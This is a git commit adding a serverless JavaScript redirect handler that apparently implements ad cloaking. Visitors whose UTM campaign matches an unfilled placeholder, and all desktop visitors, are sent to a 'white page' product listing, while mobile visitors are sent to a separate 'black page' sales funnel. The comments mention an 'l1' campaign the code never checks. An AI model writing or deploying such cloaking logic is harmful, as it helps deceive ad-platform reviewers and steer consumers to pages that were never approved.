32b251e0738e6b245800f8c8a7b6ab4155fef389
s4-glitchy <s4alicreator001@gmail.com>
2024-12-31 19:17:48 +0500

    Add files via upload

---
+++ api/redirect.js
@@ -0,0 +1,27 @@
+export default function handler(req, res) {
+    // URLs to redirect
+    const whitePageURL = "https://pinkpetals.pk/collections/new-arrivals/products/amber-gold?variant=46468169203935";
+    const blackPageURL = "https://cggkidswear.myfunnelish.com/super-active-toddler-jacket";
+  
+    // Parse the UTM parameters from the request URL
+    const queryParams = new URLSearchParams(req.url.split('?')[1]);
+    const utmCampaign = queryParams.get('utm_campaign');
+  
+    // Get the User-Agent from the request headers
+    const userAgent = req.headers['user-agent'] || '';
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+  
+    // Redirection logic
+    if (utmCampaign === '__AID_NAME__') {
+      // UTM campaign 'l1' takes priority for both desktop and mobile
+      res.writeHead(302, { Location: whitePageURL });
+    } else if (isMobileDevice) {
+      // Mobile devices without 'l1' campaign
+      res.writeHead(302, { Location: blackPageURL });
+    } else {
+      // Desktop devices without 'l1' campaign
+      res.writeHead(302, { Location: whitePageURL });
+    }
+  
+    res.end();
+  }
